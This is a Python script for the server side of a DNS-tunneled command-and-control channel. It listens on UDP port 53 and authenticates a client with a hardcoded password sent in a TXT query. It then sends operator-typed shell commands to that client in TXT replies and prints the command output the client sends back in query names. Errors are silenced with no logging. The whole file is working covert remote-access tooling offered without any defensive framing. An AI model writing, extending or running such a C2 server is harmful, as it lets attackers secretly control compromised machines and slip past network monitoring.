import socket
import threading
from dnslib import DNSRecord, QTYPE, RR, RDMAP

# Configuration
DNS_PORT = 53
LISTEN_IP = '0.0.0.0'
DOMAIN = "your.domain.gay"
client_authenticated = False
pending_command = ""  # Stores the command to be sent to the client

def handle_dns_request(data, addr, sock):
    global client_authenticated, pending_command

    try:
        d = DNSRecord.parse(data)
        qname = str(d.q.qname).strip('.')
        qtype = QTYPE[d.q.qtype]

        if qname.endswith(DOMAIN) and qtype == 'TXT':
            query = qname.replace(f".{DOMAIN}", "").strip()
            response_txt = ""

            # Handle authentication first
            if not client_authenticated:
                if query == "my_secure_password":
                    client_authenticated = True
                    response_txt = "Authenticated!"
                else:
                    response_txt = "Password required"
            
            # Interactive shell after authentication
            elif client_authenticated:
                if query == "ready":  # Client is ready to receive a command
                    if pending_command:  # Send the pending command
                        response_txt = pending_command
                        pending_command = ""  # Clear the pending command once sent
                    else:
                        response_txt = "No command yet"
                else:
                    # Client is sending back command output
                    print(f"{query}")  # Print the command output from the client

            # Create and send the DNS response
            reply = d.reply()
            reply.add_answer(RR(qname, getattr(QTYPE, qtype), rdata=RDMAP[qtype](response_txt)))
            sock.sendto(reply.pack(), addr)

    except Exception as e:
        pass  # Fail silently, no logging

def dns_server():
    """Start the DNS listener."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, DNS_PORT))

    try:
        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=handle_dns_request, args=(data, addr, sock)).start()
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

def interactive_shell():
    global pending_command
    while True:
        command = input("> ")  # Input command interactively
        if command.strip() == "exit":
            break
        pending_command = command

if __name__ == "__main__":
    # Run DNS server and interactive shell concurrently
    threading.Thread(target=dns_server, daemon=True).start()
    interactive_shell()  # Start interactive shell
